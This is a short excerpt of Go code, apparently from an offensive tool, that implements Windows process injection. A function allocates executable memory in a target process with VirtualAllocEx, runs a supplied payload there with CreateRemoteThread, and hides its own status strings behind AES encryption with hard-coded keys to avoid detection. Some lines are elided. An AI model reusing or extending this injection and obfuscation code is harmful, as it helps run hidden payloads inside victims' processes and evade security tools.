...
func CRT_Inj(process_name string, pid int, payload []byte){
   // Get PID
   ...
   // VirtualAllocEx
   var assigned_address uintptr = VAEx(proc_handle, 0, 0x1000, 0x3000, 0x40);
   ...
   // CreateRemoteThread
   res = CRT(proc_handle, 0, 0, assigned_address, 0, 0, 0);
   if (res == 0){
      var crt_err_msg string = GetAESDecrypted_aux("L3zV44ZPMno1DND9H6DkhrFcYewzzehORogytmJqtRKNGMJxVzjgQMdXPtFJMHRk", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
      fmt.Println(crt_err_msg);
      os.Exit(-1);
   }
   var created_thread_id_msg string = GetAESDecrypted_aux("UOzq0CenqVihB54lnrVJRldQnGkEc1wL+RdDRb342IY=", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
   fmt.Println(created_thread_id_msg, "\t\t", res);
